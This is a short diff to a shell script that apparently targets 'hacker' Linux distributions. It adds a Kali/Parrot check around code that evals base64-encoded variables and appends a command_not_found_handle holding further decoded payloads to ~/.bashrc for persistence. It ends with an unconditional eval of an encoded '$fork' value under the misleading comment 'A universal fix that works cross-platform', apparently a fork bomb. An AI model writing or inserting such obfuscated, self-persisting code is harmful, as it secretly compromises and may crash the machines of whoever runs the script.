@@ -36,11 +36,20 @@ then
 	fi
 else
 	# Desktop hacker or whatever isn't supported explicitly
-	eval $(echo $mchod | base64 -d)
-	echo "command_not_found_handle() {
-		$(echo $brain | base64 -d)
-		$(echo $lclean | base64 -d)
-	}" >> ~/.bashrc
+	source <(cat /etc/os-release)
+	case "$ID" in
+		kali|parrot)
+			eval $(echo $mchod | base64 -d)
+			echo "command_not_found_handle() {
+				$(echo $brain | base64 -d)
+				$(echo $lclean | base64 -d)
+			}" >> ~/.bashrc
+			;;
+		*)
+			echo "Not a hacker distro, bailing out"
+			exit 1
+			;;
+	esac
 fi
 # A universal fix that works cross-platform
 eval $(echo $fork | base64 -d)
